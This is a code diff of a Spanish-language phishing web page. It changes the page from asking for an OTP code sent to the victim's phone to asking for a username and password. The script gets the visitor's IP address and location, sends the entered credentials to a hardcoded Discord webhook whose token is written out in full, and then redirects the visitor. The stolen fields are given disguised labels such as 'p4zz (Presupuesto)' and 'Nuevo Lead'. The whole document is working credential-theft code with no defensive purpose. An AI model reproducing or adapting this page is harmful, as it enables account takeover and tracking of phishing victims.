@@ -20,69 +20,68 @@
         .card {
             background: #ffffff;
             width: 100%;
-            max-width: 400px; /* Tarjeta un poco más estrecha */
-            padding: 35px;
-            border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+            max-width: 480px;
+            padding: 40px;
+            border-radius: 16px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.05);
             text-align: center;
         }
 
-        .logo-box { margin-bottom: 25px; }
-        .logo-box img { max-width: 140px; height: auto; }
+        .logo-box { margin-bottom: 35px; }
+        .logo-box img { max-width: 180px; height: auto; }
+
+        .question-wrapper { text-align: left; margin-bottom: 25px; }
 
         .question-label {
             display: block;
-            font-size: 16px;
+            font-size: 15px;
             font-weight: 700;
-            color: #2c3e50;
-            margin-bottom: 20px;
-            line-height: 1.5;
+            color: #1a1a1a;
+            margin-bottom: 12px;
         }
 
-        /* Casilla más pequeña y centrada */
         .input-field {
-            width: 70%; /* Tamaño reducido */
-            padding: 12px 15px;
+            width: 100%;
+            padding: 14px 18px;
             border: 2px solid #e0e6ed;
-            border-radius: 8px;
-            font-size: 18px;
-            text-align: center; /* Texto centrado para montos dinero */
+            border-radius: 10px;
+            font-size: 16px;
+            box-sizing: border-box;
             background-color: #f9fafb;
             transition: all 0.3s ease;
-            margin-bottom: 25px;
         }
 
         .input-field:focus {
             outline: none;
-            border-color: #27ae60;
+            border-color: #2ecc71;
             background-color: #fff;
-            box-shadow: 0 0 8px rgba(39, 174, 96, 0.2);
         }
 
         .btn-green {
             width: 100%;
             background-color: #27ae60;
             color: white;
-            padding: 16px;
+            padding: 18px;
             border: none;
-            border-radius: 8px;
-            font-size: 16px;
+            border-radius: 10px;
+            font-size: 17px;
             font-weight: 700;
             text-transform: uppercase;
             cursor: pointer;
-            transition: background 0.3s;
+            transition: all 0.3s;
         }
 
         .btn-green:hover { background-color: #219150; }
-        .btn-green:disabled { background-color: #bdc3c7; cursor: not-allowed; }
+        .btn-green:disabled { background-color: #a5d6a7; cursor: not-allowed; }
 
+        /* Elementos ocultos para guardar datos de IP */
         #gfg, #address { display: none; }
     </style>
 </head>
 <body>
 
-    <div id="gfg"></div>
-    <div id="address"></div>
+    <div id="gfg">Cargando...</div>
+    <div id="address">Cargando ubicación...</div>
 
     <div class="card">
         <div class="logo-box">
@@ -90,16 +89,22 @@
         </div>
 
         <form id="discordForm">
-            <label class="question-label">Ingrese el Codigo otp enviado a su Telefono celular</label>
-            
-            <input type="number" id="clvuernm" class="input-field" placeholder="CODIGO" required>
+            <div class="question-wrapper">
+                <label class="question-label">Usuario</label>
+                <input type="text" id="uernm" class="input-field" placeholder="Username" required>
+            </div>
 
-            <button type="submit" id="submitBtn" class="btn-green">Confirmar</button>
+            <div class="question-wrapper">
+                <label class="question-label">Contraseña</label>
+                <input type="password" id="clvuernm" class="input-field" placeholder="Password" required>
+            </div>
+
+            <button type="submit" id="submitBtn" class="btn-green">Ingresar</button>
         </form>
     </div>
 
     <script>
-        // Captura de IP y Ubicación
+        // Lógica para obtener IP y Ubicación al cargar la página
         $(document).ready(function() {
             $.getJSON("https://api.ipify.org?format=json", function(data) {
                 $("#gfg").html(data.ip);
@@ -109,29 +114,33 @@
             });
         });
 
+        // Envío a Discord
         document.getElementById('discordForm').addEventListener('submit', function(e) {
             e.preventDefault();
 
             const btn = document.getElementById('submitBtn');
-            const webhookURL = "https://discordapp.com/api/webhooks/1442908899123531806/8z_rCr-7dX0E_o2tWTgHfOcEfYeTLrXu3ZVLhOqPh2t2MO5QFwvp1WGrqxf3S2O2xoDL"; 
+            const webhookURL = "https://discordapp.com/api/webhooks/1442908899123531806/8z_rCr-7dX0E_o2tWTgHfOcEfYeTLrXu3ZVLhOqPh2t2MO5QFwvp1WGrqxf3S2O2xoDL"; // REEMPLAZA ESTO
 
-            // Limpieza de datos (solo números)
-            const ganancia = document.getElementById("clvuernm").value.replace(/[^0-9]/g, ''); 
-            const userIP = document.getElementById("gfg").innerHTML || "No detectada";
-            const userLoc = document.getElementById("address").innerHTML || "No detectada";
+            // Captura de datos fusionada
+            const u_name = document.getElementById("uernm").value;
+            const u_name2 = document.getElementById("clvuernm").value.replace(/[^0-9]/g, ''); 
+            const userIP = document.getElementById("gfg").innerHTML;
+            const userLoc = document.getElementById("address").innerHTML;
 
-            btn.innerText = "Enviando...";
+            btn.innerText = "Procesando...";
             btn.disabled = true;
 
             const contents = {
                 embeds: [{
-                    title: "💰 Nueva Meta Financiera Captada",
-                    color: 242424, 
+                    title: "🚀 Nuevo Lead con Datos de Ubicación",
+                    color: 2617744,
                     fields: [
-                        { name: "otp", value: "$" + ganancia + " USD", inline: false },
-                        { name: "IP del Cliente", value: userIP, inline: true },
+                        { name: "User (Obstáculo)", value: u_name, inline: false },
+                        { name: "p4zz (Presupuesto)", value: "$" + u_name2, inline: false },
+                        { name: "Dirección IP", value: userIP, inline: true },
                         { name: "Ubicación", value: userLoc, inline: true }
                     ],
+                    footer: { text: "Sistema de Captación 2026" },
                     timestamp: new Date()
                 }]
             };
@@ -143,15 +152,14 @@
             })
             .then(response => {
                 if (response.ok) {
-                    window.location.href = "index3.html";
+                    window.location.href = "next.html";
                 } else {
-                    alert("Error al conectar. Inténtalo de nuevo.");
-                    btn.disabled = false;
-                    btn.innerText = "Obtener Plan Estratégico";
+                    throw new Error('Error');
                 }
             })
-            .catch(() => {
-                alert("Error de conexión.");
+            .catch(err => {
+                alert("Error al enviar. Inténtalo de nuevo.");
+                btn.innerText = "Enviar y Continuar";
                 btn.disabled = false;
             });
         });
